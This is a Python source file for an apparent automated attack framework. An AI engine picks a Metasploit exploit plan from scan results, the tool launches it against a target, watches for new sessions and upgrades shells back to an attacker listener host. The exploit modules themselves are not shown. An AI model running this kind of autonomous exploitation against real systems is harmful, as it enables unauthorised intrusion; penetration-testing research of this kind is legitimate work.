import time
import logging
from modules.scanner import ScannerUnit
from modules.exploiter import ExploiterUnit
from modules.post_exploit import PostExploitUnit
from brain.ai_engine import AIEngine

class SpectraOrchestrator:
    def __init__(self, target, lhost, msf_client):
        self.target = target
        self.lhost = lhost
        self.msf = msf_client
        self.scanner = ScannerUnit(target)
        self.exploiter = ExploiterUnit(msf_client.client)
        self.post = PostExploitUnit(msf_client.client)
        self.brain = AIEngine()

    def run(self):
        recon = self.scanner.scan_services()
        plan = self.brain.get_strategy(recon)
        if not plan: return
        
        pre_sessions = set(self.msf.client.sessions.list.keys())
        console = self.exploiter.execute(plan, self.target)
        
        start = time.time()
        while time.time() - start < 60:
            current = set(self.msf.client.sessions.list.keys())
            new = current - pre_sessions
            if new:
                s_id = list(new)[0]
                if self.msf.client.sessions.list[s_id]['type'] == 'shell':
                    self.post.upgrade_shell(s_id, self.lhost)
                    continue
                return True
            
            log = console.read()['data']
            if "Exploit completed" in log:
                logging.error(f"Failed: {self.exploiter.classify_log(log)}")
                break
            time.sleep(5)
        return False
